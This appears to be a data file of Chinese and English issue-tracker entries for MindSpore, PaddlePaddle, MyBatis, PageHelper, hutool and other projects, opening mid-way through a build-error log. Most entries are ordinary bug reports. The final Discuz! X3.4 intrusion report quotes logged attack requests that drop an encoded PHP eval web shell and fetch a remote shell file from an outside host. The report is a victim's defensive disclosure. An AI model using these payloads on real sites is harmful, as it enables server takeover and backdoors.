-o cmTC_cbe5d -lpthreads /usr/bin/ld: cannot find -lpthreads collect2: error: ld returned 1 exit status CMakeFiles/cmTC_cbe5d.dir/build.make:105: recipe for target 'cmTC_cbe5d' failed make[1]: *** [cmTC_cbe5d] Error 1 make[1]: Leaving directory '/home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Makefile:140: recipe for target 'cmTC_cbe5d/fast' failed make: *** [cmTC_cbe5d/fast] Error 2 Determining if the aarch64 exist failed with the following output: Change Dir: /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp Run Build Command(s):/usr/bin/make cmTC_2a041/fast &amp;&amp; /usr/bin/make -f CMakeFiles/cmTC_2a041.dir/build.make CMakeFiles/cmTC_2a041.dir/build make[1]: Entering directory '/home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Building C object CMakeFiles/cmTC_2a041.dir/CheckSymbolExists.c.o /usr/bin/cc -o CMakeFiles/cmTC_2a041.dir/CheckSymbolExists.c.o -c /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c: In function ‘main’: /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c:7:19: error: ‘aarch64’ undeclared (first use in this function); did you mean ‘amd64’? return ((int*)(&amp;aarch64))[argc]; ^~~~~~~~~~~ amd64 /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c:7:19: note: each undeclared identifier is reported only once for each function it appears in CMakeFiles/cmTC_2a041.dir/build.make:84: recipe for target 'CMakeFiles/cmTC_2a041.dir/CheckSymbolExists.c.o' failed make[1]: *** [CMakeFiles/cmTC_2a041.dir/CheckSymbolExists.c.o] Error 1 make[1]: Leaving directory '/home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Makefile:140: recipe for target 'cmTC_2a041/fast' failed make: *** [cmTC_2a041/fast] Error 2 File /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp/CheckSymbolExists.c: /* */ int main(int argc, char** argv) { (void)argv; #ifndef aarch64 return ((int*)(&amp;aarch64))[argc]; #else (void)argc; return 0; #64 I sincerely hope you can give me some instructions how to fix this bug. Thank you in advance!   <code>: main': src.c:(.text+0x3e): undefined reference to pthread_detach' src.c:(.text+0x56): undefined reference to pthread_join' src.c:(.text+0x7b): undefined reference to"
2.11.x计划,"主要是增强结果集映射功能 自定义映射实现（增强以前功能） 扩展标签，支持自定义结果集后处理器，用于实现ORM，还有各种映射规则，比如 user 包含roles属性，roles包含permission属性   <code>: @mapping(""roles""){ r.* @mapping(""permssiton""){ p.* @} @}"
Redis默认配置文件变量建议取消final,JDK版本： openjdk_11_10 hutool版本： 5.7.11 错误信息代码 项目需要打包成一个可执行的jar文件的时候会导致读取不到配置文件   <code>: cn.hutool.setting.SettingLoader: Load setting file [jar:file:/home/x-1.0-SNAPSHOT.jar!/config/redis.setting]
integer_value_sequence与sparse_binary_vector的区别,"问题1 在05.recommender_system的train.py代码中category_id与movie_title的数据形式应该是一致的，都是有多个nominal的可能值。具体来说就是，category_id对应category_dict中的多个取值，movie_title类似。 但是这两个选择了不同的数据类型integer_value_sequence与sparse_binary_vector，这个有什么区别。如果没有区别的话，在实际中要怎么选择。 问题2 在代码中 在给出的例子中nominal类型的数据都先建立一个nominal特征的dict用来存储nominal特征的全部可能，假设全部可能为len = length(dict)全集。然后得到每个nomial特征唯一的index。index的取值为[1, index]。 问，是否可以使用简单的hash得到index，而不用经过建dict，找唯一index这个步骤？ 再具体的，如果我的nominal特征是user_id，user_id共有100个取值可能，第一个user_id的取值为999，第二个user_id取值为888。这些user_id是否可以直接以下面的形式使用。 问题3 在问题2的例子中，使用的数据类型是integer_value，能否使用sparse_binary_vector。区别是什么？   <code>: def get_mov_combined_features(): movie_title_dict = paddle.dataset.movielens.get_movie_title_dict() mov_id = paddle.layer.data( name='movie_id', type=paddle.data_type.integer_value( paddle.dataset.movielens.max_movie_id() + 1)) mov_emb = paddle.layer.embedding(input=mov_id, size=32) mov_fc = paddle.layer.fc(input=mov_emb, size=32) mov_categories = paddle.layer.data( name='category_id', type=paddle.data_type.sparse_binary_vector( #Datatype: sparse_binary_vector len(paddle.dataset.movielens.movie_categories()))) mov_categories_hidden = paddle.layer.fc(input=mov_categories, size=32) mov_title_id = paddle.layer.data( name='movie_title', type=paddle.data_type.integer_value_sequence(len(movie_title_dict))) #Datatype: integer_value_sequence mov_title_emb = paddle.layer.embedding(input=mov_title_id, size=32) mov_title_conv = paddle.networks.sequence_conv_pool( input=mov_title_emb, hidden_size=32, context_len=3) global MOVIE_TITLE_DICT MOVIE_TITLE_DICT = dict() for i, w in enumerate(title_word_set): MOVIE_TITLE_DICT[w] = i global CATEGORIES_DICT CATEGORIES_DICT = dict() for i, c in enumerate(categories_set): CATEGORIES_DICT[c] = i user_id = paddle.layer.data( name='user', type=paddle.data_type.integer_value(100)) #使用的数据类型是integer_value"
针对mybatis一对多的配置，分页后结果就不对了,"如下面的配置： 最终导致User对象中的 List roles 属性的为空，如果不分页就没有问题。 请问该如何解决？   <code>: &lt;resultMap id=""BaseResultMap"" type=""User"" &gt; &lt;id column=""id"" property=""id"" jdbcType=""INTEGER"" /&gt; &lt;result column=""org_id"" property=""orgId"" jdbcType=""INTEGER"" /&gt; &lt;result column=""name"" property=""name"" jdbcType=""VARCHAR"" /&gt; &lt;result column=""gender"" property=""gender"" jdbcType=""INTEGER"" /&gt; &lt;result column=""email"" property=""email"" jdbcType=""VARCHAR"" /&gt; &lt;result column=""phone"" property=""phone"" jdbcType=""VARCHAR"" /&gt; &lt;collection property=""roles"" ofType=""Role""&gt; &lt;id column=""role_id"" property=""roleId"" jdbcType=""INTEGER"" /&gt; &lt;id column=""role_name"" property=""roleName"" jdbcType=""VARCHAR"" /&gt; &lt;/collection&gt; &lt;/resultMap&gt;"
【众智】【计算-AICPU开发】TrilIndices,"TrilIndices Tasks AICPU算子适配 + functional接口 + CPU算子迁移 Introduction 返回tril元素的indices，dim*N的下三角索引数组 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py class TrilIndices(Primitive): row int 属性 col int 属性 offset int 属性 dtype mstype.dtype 属性 y 对应底层算子 对应底层AI CPU算子TrilIndices 对标接口参考 PyTorch1.8.1接口： torch.tril_indices https://pytorch.org/docs/stable/generated/torch.tril_indices.html 3. 异常处理 4. 算子反向 无反向   <code>: def tril_indices(row: int, col: int, offset: int = 0, dtype: mstype.dtype = mstype.int64) -&gt; tensor: return y ``` REG_OP(TrilIndices) .OUTPUT(y, TensorType::IndexNumberType()) /* ""Result, has targeted element type"" */ .REQUIRED_ATTR(row, Int) .REQUIRED_ATTR(col, Int) .ATTR(offset, Int, 0) .ATTR(dtype, Type, DT_INT64) .OP_END_FACTORY_REG(TrilIndices) ```"
[OCCM][CT][MS][maskedfill]maskedfill算子ascend后端，反向有精度问题,"maskedfill算子ascend后端，反向有精度问题 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph def test_functional_maskedfill_input_7d(): input_x1 = Tensor(np.random.randn(2, 5, 6, 5, 8, 5, 3), dtype=mstype.uint8) input_x2 = Tensor(np.random.choice(a=[False, True], size=(2, 5, 6, 5, 8, 5, 3), p=[0.5, 0.5]), dtype=mstype.bool_) input_x3 = Tensor(np.random.randn(), dtype=mstype.uint8) fact = MaskedFillFuncMock(inputs=[input_x1, input_x2, input_x3]) fact.forward_cmp() ../operations_occm/test_f_maskedfill.py:192: ../share/ops/functional/maskedfill_ops.py:118: in grad_cmp self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) data_expected = array(54, dtype=uint8), data_me = array(224, dtype=uint8) rtol = 0, atol = 0 E AssertionError: E data_expected_std:[54] E data_me_error:[224] E loss:[86] ../share/utils.py:24: AssertionError   <code>: fact.grad_cmp() def test_functional_maskedfill_input_7d(): input_x1 = Tensor(np.random.randn(2, 5, 6, 5, 8, 5, 3), dtype=mstype.uint8) input_x2 = Tensor(np.random.choice(a=[False, True], size=(2, 5, 6, 5, 8, 5, 3), p=[0.5, 0.5]), dtype=mstype.bool_) input_x3 = Tensor(np.random.randn(), dtype=mstype.uint8) fact = MaskedFillFuncMock(inputs=[input_x1, input_x2, input_x3]) fact.forward_cmp() fact.grad_cmp() def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ format(data_expected[greater], data_me[greater], error[greater])"
"Wrapper为空,但是page.getCondition()不为空的情况,Condition无法传递问题","使用serviceImpl.selectPage(page) 方法，page中的condition条件没有带入到查询中去，debug 发现 2 fillWrapper操作的是Condition.create的新对象   <code>: @RequestMapping(""/rolePage"") public Page rolePage(@RequestParam Map&lt;String, Object&gt; params) { params.put(CommonConstant.DEL_FLAG, CommonConstant.STATUS_NORMAL); Page page = new Page(1,10); page.setCondition(params); return sysRoleService.selectPage(page); }"
在训练中输出的日志可以判断模型的情况吗?比如过拟合,"在分类训练中,通常会输出这样的日志: 在这些日志中可以判断model有什么问题吗?   <code>: Pass 0, Batch 0, Cost 28.375774, {'classification_error_evaluator': 0.703125} ...................... Test with Pass 0, {'classification_error_evaluator': 0.6833333373069763} Pass 1, Batch 0, Cost 1.136431, {'classification_error_evaluator': 0.6796875} ...................... Test with Pass 1, {'classification_error_evaluator': 0.6333333253860474} Pass 2, Batch 0, Cost 1.088741, {'classification_error_evaluator': 0.59375} ...................... Test with Pass 2, {'classification_error_evaluator': 0.6333333253860474} Pass 3, Batch 0, Cost 1.109857, {'classification_error_evaluator': 0.6484375} ...................... Test with Pass 3, {'classification_error_evaluator': 0.6666666865348816} Pass 4, Batch 0, Cost 1.084528, {'classification_error_evaluator': 0.625} ...................... Test with Pass 4, {'classification_error_evaluator': 0.6333333253860474} Pass 5, Batch 0, Cost 1.084450, {'classification_error_evaluator': 0.59375} ...................... Test with Pass 5, {'classification_error_evaluator': 0.6666666865348816} Pass 6, Batch 0, Cost 1.103440, {'classification_error_evaluator': 0.6953125} ...................... Test with Pass 6, {'classification_error_evaluator': 0.6333333253860474} Pass 7, Batch 0, Cost 1.092799, {'classification_error_evaluator': 0.578125} ...................... Test with Pass 7, {'classification_error_evaluator': 0.6000000238418579} Pass 8, Batch 0, Cost 1.099837, {'classification_error_evaluator': 0.6796875} ...................... Test with Pass 8, {'classification_error_evaluator': 0.5333333611488342} Pass 9, Batch 0, Cost 1.095620, {'classification_error_evaluator': 0.6796875} ...................... Test with Pass 9, {'classification_error_evaluator': 0.6333333253860474}"
Merge maps in OpRegistry and simplify register macros,"In this PR, we fix #3435:Test paddle/paddle/memory, and changed definitions of register macros: And also there are some small alterations in macros: Most operators have corresponding gradient operators, but in our code, some of them have not been completed. To pass compiling, I have to register these forward-only operators by for the moment. PLEASE AMEND THEM TO AFTER FINISHING THEIR GRADIENTS.   <code>: // register an operator as well as its gradient version REGISTER_OP(op_type, op_class, op_maker_class, grad_op_type, grad_op_class) // register an operator without any gradient version REGISTER_OP_WITHOUT_GRADIENT(op_type, op_class, op_maker_class) USE_XXX // use an operator and all its available kernels USE_OP(op_type) // use an operator and its CPU kernels USE_CPU_ONLY_OP(op_type) // only use operator itself, no searching or linking job of its kernels // e.g. RNN op USE_OP_ITSELF(op_type) REGISTER_OP_WITHOUT_GRADIENT REGISTER_OP"
"Implementation of paddle.attr.Param ignore the globally set initialization mean and std, and force me to use smart initalization","There is a code snippet from https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/trainer_config_helpers/attrs.py#L139: in training, I may prefer another initialization strategy, such as initialization from a Gaussian distribution with a default mean and std, rather than use smart initialization. to do this, I will set the global initialization std and mean. The implementation above ignores the globally set mean and std. If I just use to tune the learning rate or any other parameters except , , , and like below. The codes then force me to use smart initialization. It ignores the default initialization std I set.   <code>: paddle/trainer_config_helpers/attrs.py def __init__(self, name=None, is_static=False, initial_std=None, initial_mean=None, initial_max=None, initial_min=None, l1_rate=None, l2_rate=None, learning_rate=None, momentum=None, gradient_clipping_threshold=None, sparse_update=False, update_hooks=None, initializer=None): self.attr = {} if is_static: self.attr['is_static'] = True if initial_std is None and initial_mean is None and initial_max \ is None and initial_min is None: self.attr['initial_smart'] = True paddle.attr.Param initial_std initial_mean initial_max initial_min param_attr=paddle.attr.Param(learning_rate=0.1)"
【众智】【计算-用户接口】Copysign,Copysign functional接口 创建一个新张量，其输入的大小和其他元素的符号。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py PyTorch1.8.1接口： torch.copysign https://pytorch.org/docs/stable/generated/torch.copysign.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: def copysign(input: tensor) -&gt;tensor: return y
PageHelper给含有like模糊查询的sql分页时，只执行_COUNT计算总数，不执行之后的具体查询逻辑,"现象如标题所说，有跟代码到SqlUtil类中去看 可是明明查询count的sql拿到Mysql中直接执行是有非零结果的，可是这里的count却是0。 如果把sql中的like模糊查询去掉，就没有这样的现象。 已经困扰三天没有找到解决思路，作者能帮忙看下吗？是不是需要把相关配置贴上来给你看？（配置贴在了3、4L） 有翻过被closed掉的issue，貌似有相似的问题，但是被作者关掉了。   <code>: //执行 count 查询 Object countResultList = executor.query(countMs, parameterObject, RowBounds.DEFAULT, resultHandler, countKey, countBoundSql); ... if (count == 0L) { //当查询总数为 0 时，直接返回空的结果 return runtimeDialect.afterPage(new ArrayList(), parameterObject, rowBounds); } ..."
jcseg集成到elasticsearch中，无法使用detect模式,"按照你得配置把jcseg插件集成到elasticsearch中，url输入如下： http://127.0.0.1:9200/_analyze?analyzer=detect&amp;pretty=true&amp;text=兰德酷路泽纯黑顶配，得到如下结果： { ""error"" : { ""root_cause"" : [ { ""type"" : ""remote_transport_exception"", ""reason"" : ""[Vanisher][127.0.0.1:9300][indices:admin/analyze[s]]"" } ], ""type"" : ""illegal_argument_exception"", ""reason"" : ""failed to find analyzer [detect]"" }, ""status"" : 400 } elasticsearch.yml配置如下： index: analysis: index.analysis.analyzer.default.type : ""jcseg"" 想知道哪里的问题？   <code>: tokenizer: jcseg_complex: type: jcseg seg_mode: complex config_file: config/jcseg/jcseg.properties # config_file: self define jcseg.properties file path [optional] jcseg_simple: type: jcseg seg_mode: simple config_file: config/jcseg/jcseg.properties # config_file: optional self define jcseg.properties file path [optional] jcseg_detect: type: jcseg seg_mode: detect config_file: config/jcseg/jcseg.properties # config_file: self define jcseg.properties file path [optional] analyzer: jcseg_complex: type: custom filter: - lowercase tokenizer: jcseg_complex jcseg_simple: type: custom filter: - lowercase tokenizer: jcseg_simple jcseg_detect: type: custom filter: - lowercase tokenizer: jcseg_detect"
[MDT][FUNC]PopulationCount算子问题,"1.算子不支持uint16 2.算子精度不达标（对标tensorflow） 3.算子性能不达标（对标tensorflow） / 硬件环境: /device CPU : -- MindSpore version : MindSpore 1.8.0 [sha1]:09106a25 -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 18.04.6 -- GCC/Compiler version : 7.5.0 (/): /mode pynative /mode graph 见截图 见截图   <code>: # 功能（不支持uint16）： def test_func(): inputs_np = np.random.randn(64, 1269).astype(np.uint16) inputs = Tensor(inputs_np) op.PopulationCount(inputs) # 精度： def test_acc(): inputs_np = np.random.randn(64, 1269).astype(np.int16) inputs = Tensor(inputs_np) tf = tf.raw_ops.PopulationCount(x=inputs_np) ms = ms_op.PopulationCount(inputs) acc_cmp(tf,ms) # 性能： def test_perf(): inputs_np = np.random.randn(3000, 3000).astype(np.int16) perf_cmp(inputs_np)"
Reshape 接口在动态图模式下shape参数不允许传入Variable,"paddle1.8.1动态图： batch_size如下图所示： 错误如下：   <code>: The type of 'shape' in reshape must be list[int] or tuple(int) in Dygraph mode, but received &lt;class 'tuple'&gt;, which contains Variable."
专用generator关于生成ANNOTATEDMAPPER类型Mapper接口文件自动引入包问题,"只是一个学习的demo; 在使用如下配置生成基于注解的Mapper以后; 自动引用了org.apache.ibatis.annotations.Select; 然后我没导这个包给我报错,文档内没找到关于生成基于注解的demo;请问这是正常现象吗? 如下是完整配置文件: POM.xml 这是生成的UserMapper文件 小白望指教   <code>: &lt;!DOCTYPE generatorConfiguration PUBLIC ""-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"" ""http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd""&gt; &lt;!--suppress MybatisGenerateCustomPluginInspection --&gt; &lt;generatorConfiguration&gt; &lt;context id=""Mysql"" targetRuntime=""MyBatis3Simple"" defaultModelType=""flat""&gt; &lt;property name=""javaFileEncoding"" value=""UTF-8""/&gt; &lt;property name=""useMapperCommentGenerator"" value=""true""/&gt; &lt;plugin type=""tk.mybatis.mapper.generator.MapperPlugin""&gt; &lt;property name=""mappers"" value=""tk.mybatis.mapper.common.Mapper""/&gt; &lt;property name=""caseSensitive"" value=""false""/&gt; &lt;property name=""forceAnnotation"" value=""true""/&gt; &lt;property name=""beginningDelimiter"" value=""`""/&gt; &lt;property name=""endingDelimiter"" value=""`""/&gt; &lt;property name=""lombok"" value=""Getter,Setter,Accessors,ToString""/&gt; &lt;/plugin&gt; &lt;commentGenerator&gt; &lt;property name=""suppressDate"" value=""true""/&gt; &lt;/commentGenerator&gt; &lt;jdbcConnection driverClass=""com.mysql.jdbc.Driver"" connectionURL=""jdbc:mysql://localhost:3306/demo"" userId=""hugo"" password=""123""&gt; &lt;/jdbcConnection&gt; &lt;javaModelGenerator targetPackage=""hugo.entity"" targetProject=""src/main/java""/&gt; &lt;javaClientGenerator type=""ANNOTATEDMAPPER"" targetPackage=""hugo.entity"" targetProject=""src/main/java""/&gt; &lt;table tableName=""tb_user"" domainObjectName=""User""&gt; &lt;generatedKey column=""id"" sqlStatement=""Mysql"" identity=""true""/&gt; &lt;/table&gt; &lt;/context&gt; &lt;/generatorConfiguration&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;4.1.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; package hugo.entity; import org.apache.ibatis.annotations.Select; import tk.mybatis.mapper.common.Mapper; public interface UserMapper extends Mapper&lt;User&gt; { }"
pybind can't get tensor.holder_ from forward function,"下边是我在forward Compute function中加的log, 看最后两行： forward Compute function输出的日志是： 下边是我在tensor_py.h加的log: tensor_py.h输出的日志是： 以下是unitest相关代码： 请问我在forward Compute function中对out处理有误？或者单测配置op方式不正确？   <code>: void Compute(const framework::ExecutionContext &amp;context) const override { auto *x = context.Input&lt;Tensor&gt;(""X""); auto *out = context.Output&lt;Tensor&gt;(""Out""); auto x_data = x-&gt;data&lt;T&gt;(); T *out_data = out-&gt;mutable_data&lt;T&gt;(context.GetPlace()); auto x_dims = x-&gt;dims(); auto out_dims = out-&gt;dims(); int64_t out_count = framework::product(out_dims); std::vector&lt;int64_t&gt; x_shape = framework::vectorize(x_dims); std::vector&lt;int64_t&gt; out_shape = framework::vectorize(out_dims); auto offsets = context.op().Attr&lt;std::vector&lt;int&gt;&gt;(""offsets""); PADDLE_ENFORCE_EQ( x_dims.size(), offsets.size(), ""Offsets size should be equal to dimension size of input tensor.""); std::vector&lt;std::pair&lt;int, int&gt;&gt; crop_rules(x_dims.size()); for (size_t i = 0; i &lt; crop_rules.size(); ++i) { crop_rules[i].first = offsets[i]; crop_rules[i].second = x_dims[i] - out_dims[i] - offsets[i]; } for (int64_t i = 0; i &lt; out_count; ++i) { out_data[i] = x_data[transIndex(out_shape, x_shape, crop_rules, i)]; } LOG(INFO) &lt;&lt; ""finish CropCPUKernel tensor="" &lt;&lt; out; LOG(INFO) &lt;&lt; ""finish CropCPUKernel holder="" &lt;&lt; out-&gt;holder(); } finish CropCPUKernel tensor=0x3103f80 finish CropCPUKernel holder=0xea9a70 template &lt;size_t I, typename... ARGS&gt; struct CastToPyBufferImpl&lt;true, I, ARGS...&gt; { using CUR_TYPE = typename std::tuple_element&lt;I, std::tuple&lt;ARGS...&gt;&gt;::type; py::buffer_info operator()(framework::Tensor &amp;tensor) { LOG(INFO) &lt;&lt; ""CastToPyBufferImpl()""; LOG(INFO) &lt;&lt; ""tensor.holder_ : "" &lt;&lt; tensor.holder_; tensor.holder_-&gt;type(); // Segmentation fault here LOG(INFO) &lt;&lt; ""tensor.holder_-&gt;type() finsh""; ...... I0918 10:14:25.344431 29723 tensor_py.h:88] CastToPyBuffer I0918 10:14:25.344435 29723 tensor_py.h:45] CastToPyBufferImpl() I0918 10:14:25.344439 29723 tensor_py.h:46] tensor.holder_ : 0 Segmentation fault class TestCropOp(OpTest): def setUp(self): self.op_type = ""crop"" self.crop_by_input = False self.attrs = {} self.initTestCase() self.attrs['offsets'] = self.offsets if self.crop_by_input: self.inputs = { 'X': np.random.random(self.x_shape).astype(""float32""), 'Y': np.random.random(self.crop_shape).astype(""float32"") } else: self.attrs['shape'] = self.crop_shape self.inputs = { 'X': np.random.random(self.x_shape).astype(""float32""), } self.outputs = { 'Out': crop(self.inputs['X'], self.offsets, self.crop_shape) } def initTestCase(self): self.x_shape = (8, 8) self.crop_shape = (2, 2) self.offsets = [1, 2] def test_check_output(self): self.check_output()"
Should we split Executor::Run into Executor::Prepare and Executor::exe,"Problem We create new operators in CPP when is invoked since we assume the topology may be changed every time. However, the program is usually not changed. To create operators locally or sending protobuf again and again to a remote node is very time-consuming. Solution To reduce the time cost of creating operators in local mode and network communication in cluster mode, we can extract a method named . Prepare return a . In local mode, It could be an array index of an internal data structure of Executor. The internal data structure holds the C++ operators which the program contains. In cluster mode, could just send the protobuf of the program to a remote node. The handle could be an RPC return value. We can just send the HANDLE to remote to execute the associated program, instead of serializing and sending protobuf again and again.   <code>: Executor::Run Executor::Prepare class Executor { public: using HANDLE=int; virtual HANDLE Prepare(program, feed_list, fetch_list) = 0; virtual void Exec(HANDLE handle) = 0; void Run(program, feed_list, fetch_list) { Exec(Prepare(program, feed_list, fetch_list)); } private: vector&lt;Ops&gt; prepared_ops_; }; HANDLE Prepare"
Change `PADDLE_ONLY_CPU` to `PADDLE_WITH_GPU`,Fixes https://github.com/PaddlePaddle/Paddle/issues/4588 By shell command   <code>: sed -i 's#ifdef PADDLE_ONLY_CPU#ifndef PADDLE_WITH_GPU#g' `find ./paddle/ -name '*.h' -o -name '*.cc' -o -name '*.cpp' -o -name '*.c'` sed -i 's#ifndef PADDLE_ONLY_CPU#ifdef PADDLE_WITH_GPU#g' `find ./paddle/ -name '*.h' -o -name '*.cc' -o -name '*.cpp' -o -name '*.c'`
The Infer-shape process can be simplified,"Now our shape inference is a very winding. Here is an example: to get some non-duplicatable input's in compile time, our program has to switch repeatedly between and . The call stack is like this: (Calling from top to bottom) What happens at runtime is similar, just replace with . There are at least two issues here: For a non-duplicatable input, the is invoked, while for a duplicatable input the will be directly invoked. It mean's the entries of the same function dispersed in two class. is intended for duplicatable inputs. However, even the input is non-duplicatable, it will still be invoked indirectly. That is inefficient. Solution: Move the from (and ) to . And the invokes directly instead of detouring via .   <code>: dim CompileTimeInferShapeContext InferShapeContext DDim CompileTimeInferShapeContext::GetInputDim(string param_name); | vector&lt;DDim&gt; InferShapeContext::GetInputsDim(string param_name); | vector&lt;DDim&gt; InferShapeContext::GetDims(vectir&lt;string&gt; arg_name); | DDim CompileTimeInferShapeContext::GetDim(string arg_name); | DDim VerDesc::Shape(); CompileTimeInferShapeContext RuntimeInferShapeContext CompileTimeInferShapeContext::GetInputDim InferShapeContext::GetInputsDim vector&lt;DDim&gt; InferShapeContext::GetInputsDim(string param_name); GetInputDim CompileTimeInferShapeContext RunimeInferShapeContext InferShapeContext GetInputDim GetDim GetInputsDim"
仪表盘 ： type:gauge 浮点数显示异常,"仪表盘 ： type:gauge 显示浮点数时候显示异常 刻度值显示 0.1+0.2= 0.30000... 等等 解决 无 显示异常   <code>: { // startNumber:0, // endNumber:100, startNumber:0, endNumber:1, } function drawGaugeLabel(gaugeOption, radius, centerPosition, opts, config, context) { ...略 for (let i = 0; i &lt; gaugeOption.splitLine.splitNumber + 1; i++) { ...略 // nowNumber += splitNumber; nowNumber = accAdd(nowNumber,splitNumber) } function accAdd(arg1, arg2) { let r1 = deal(arg1); let r2 = deal(arg2); let m = Math.pow(10, Math.max(r1, r2)) return(arg1 * m + arg2 * m) / m } function deal(arg) { let t = 0; try { t = arg.toString().split(""."")[1].length } catch(e) {} return t; } }"
"[CT][MS][pynative]For single dynamic input, the cpu kernel should register the 'AddSkipCheckAttr' or 'AddAllSameAttr'","For single dynamic input, the cpu kernel should register the 'AddSkipCheckAttr' or 'AddAllSameAttr' / 硬件环境: /device CPU : -- MindSpore version :master-45499 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative pytest -s sparse/test_cootensor.py::test_cootensor_values_astype_train case pass   <code>: def test_cootensor_values_astype_train(): values_shape = 1024 shape, _, _, indices = data_generate(values_shape) values = np.random.randn(values_shape, ).astype(np.float32) net = COOTensorastypeNet(shape) net(Tensor(indices), Tensor(values)) net_grad = GradOfAllInputs(net, sens_param=False) &gt; grad = net_grad(Tensor(indices), Tensor(values)) self = &lt;mindspore.common.api._PyNativeExecutor object at 0x7f870f6ee6d0&gt; def __call__(self): """""" PyNative executor run grad graph. Return: The return object after running grad graph. """""" &gt; return self._executor() E RuntimeError: For single dynamic input, the cpu kernel should register the 'AddSkipCheckAttr' or 'AddAllSameAttr'. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/cpu/hal/device/kernel_select_cpu.cc:206 ExpandMultiDynamicAttr /root/miniconda3/envs/ci3.7_torch1.11/lib/python3.7/site-packages/mindspore/common/api.py:960: RuntimeError"
x3.4 discuz_application.php 入侵漏洞,"Describe 发现网站被入侵, 偶然间搜索到 data/log/*_errorlog.php里边包含失败的入侵请求, 怀疑真正入侵在这些失败入侵之后. Error Info 以及 Discuz! Version: Discuz! X3.4/20190206 GBK Release Version: UCenter 1.6.0 Release 20170101 OS Version: CentOS 7 PHP Version: Linux / PHP v7.3.30 MySQL / MariaDB Version: 5.6.51-log Memory Cache Type and Version: N/A 因为我的discuz版本可能较旧, 不确定该漏洞是否已被修复, 希望如果知道请告知.   <code>: &lt;?PHP exit;?&gt; 1631294904 &lt;b&gt;您当前的访问请求当中含有非法字符，已经被系统拒绝&lt;/b&gt;&lt;br&gt;&lt;b&gt;PHP:&lt;/b&gt;index.php:0132 -&gt; forum.php:0057 -&gt; source/class/discuz/discuz_application.php:0071 -&gt; source/class/discuz/discuz_application.php:0558 -&gt; source/class/discuz/discuz_application.php:0374 -&gt; source/function/function_core.php:0023 -&gt; source/class/discuz/discuz_error.php:0024 bd88c5c3c45d832bdb9df5bd8e2b3fc4 &lt;b&gt;User:&lt;/b&gt; uid=0; IP=103.98.112.66; RIP:162.158.178.24 Request: //index.php?m=--%3E%3C?=file_put_contents('nice.php',base64_decode(%22PD9waHAKY2xhc3MgeHsKICAgIHB1YmxpYyBmdW5jdGlvbiBpcCgpewogICAgICAgICRjPSAiICRfUE9TVFtuaWNlXSI7CiAgICAgICAgcmV0dXJuICRjOwogICAgfQp9CiRjID0gbmV3IHgoKTsKJGIgPSAkYyAtPiBpcCgpOwpldmFsKCRiKTsKcHJpbnQobWQ1KCJSaW5nbyIpKTsKPz4=%22));?%3E &lt;?PHP exit;?&gt; 1619099593 &lt;b&gt;您当前的访问请求当中含有非法字符，已经被系统拒绝&lt;/b&gt;&lt;br&gt;&lt;b&gt;PHP:&lt;/b&gt;index.php:0132 -&gt; forum.php:0057 -&gt; source/class/discuz/discuz_application.php:0071 -&gt; source/class/discuz/discuz_application.php:0558 -&gt; source/class/discuz/discuz_application.php:0374 -&gt; source/function/function_core.php:0023 -&gt; source/class/discuz/discuz_error.php:0024 bd88c5c3c45d832bdb9df5bd8e2b3fc4 &lt;b&gt;User:&lt;/b&gt; uid=0; IP=27.124.2.27; RIP:162.158.118.116 Request: /index.php?m=home&amp;amp;a=assign_resume_tpl&amp;amp;variable=1&amp;amp;tpl=%3C?php%20$b='base'.'64_'.'de'.'code';copy($b('aHR0cDovL3NoZWxsLnlhYm9sdW9kaXllLnRvcC9yb29raWUucGhw'),$b('Li9kYXRhL2JhY2t1cC9kYXRhYmFzZS94bW0ucGhw'));%20ob_flush();?%3E/r/n"
